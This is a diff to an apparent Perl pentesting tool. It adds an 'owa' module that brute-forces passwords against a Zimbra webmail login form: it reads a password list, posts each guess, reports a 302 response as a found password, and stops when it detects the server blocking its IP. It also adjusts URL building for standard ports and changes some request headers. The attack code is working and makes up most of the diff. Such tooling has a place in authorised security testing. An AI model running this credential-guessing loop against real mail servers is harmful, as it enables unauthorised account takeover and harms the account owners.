@@ -130,7 +130,11 @@ foreach my $file (@links) {
 	case "pl"	{ $file =~ s/EXT/pl/g;  }
     }
 
-	my $url = "$proto://".$rhost.":".$rport.$path.$file;  
+	my $url ;
+	if ($rport eq '80' || $rport eq '443')
+		{$url = "$proto://".$rhost.":".$path.$file; }
+	else
+		{$url = "$proto://".$rhost.":".$rport.$path.$file; }
         
 	#print "getting $url \n";
 	
@@ -613,6 +617,54 @@ if ($module eq "ZKSoftware")
 	close MYINPUT;	
 }#ZKSoftware
 
+if ($module eq "owa")
+{
+	my $counter = 1;	
+	open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
+	while (my $password=<MYINPUT>)
+	{ 
+		$password =~ s/\n//g; 	
+		my $hash_data = {"loginOp" => "login",
+						 "client" => "preferred",
+						'username' => $user, 
+						'password' => $password
+				};	
+	
+		my $post_data = convert_hash($hash_data);
+		
+		$headers->header("Content-Type" => "application/x-www-form-urlencoded");
+		$headers->header("Cookie" => "ZM_TEST=true");
+		$headers->header("Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");				
+		
+		my $response = $self->dispatch(url => $url,method => 'POST',post_data =>$post_data, headers => $headers);
+		my $decoded_response = $response->decoded_content;
+		my $status = $response->status_line;
+		
+		if ($decoded_response =~ /error en el servicio de red|network service error/i)
+		{				 
+			print "El servidor Zimbra esta bloqueando nuestra IP :( \n";
+			last;
+										
+		}	
+		
+		
+		print "[+] user:$user password:$password status:$status\n";
+		if ($status =~ /302/m)
+		{				 
+			print "Password encontrado: [zimbra] $url (Usuario:$user Password:$password)";
+			last;
+										
+		}
+		
+		#if (0 == $counter % 10) {
+			#print "Sí es múltiplo de 10\n";
+			#sleep 120;
+		#}			
+		$counter = $counter + 1;
+		#sleep 1;
+	}
+	close MYINPUT;	
+}#owa
 
 if ($module eq "zimbra")
 {
@@ -662,6 +714,7 @@ if ($module eq "zimbra")
 	}
 	close MYINPUT;	
 }#zimbra
+
 
 #ZTE
 if ($module eq "zte")
@@ -1472,11 +1525,11 @@ my $user_agent = @user_agents[rand($#user_agents+1)];
 print "user_agent $user_agent \n" if ($debug);
 
 $headers->header('User-Agent' => "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"); 
-$headers->header('Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'); 
+$headers->header('Accept' => '*/*'); 
 $headers->header('Connection' => 'close'); 
 $headers->header('Cache-Control' => 'max-age=0'); 
 $headers->header('DNT' => '1'); 
-$headers->header('Upgrade-Insecure-Requests' => '1'); 
+#$headers->header('Upgrade-Insecure-Requests' => '1'); 
 #$headers->header('' => ''); 
 
 
@@ -1631,7 +1684,8 @@ if ($proto eq '')
 	else
 		{$self->proto('http'); print "NO SSL detected \n" if ($debug);}
 }
-
+#$proxy_host='127.0.0.1';
+#$proxy_port='8083';
 print "proxy_env $proxy_env \n" if ($debug);
 
 if ( $proxy_env eq 'ENV' )
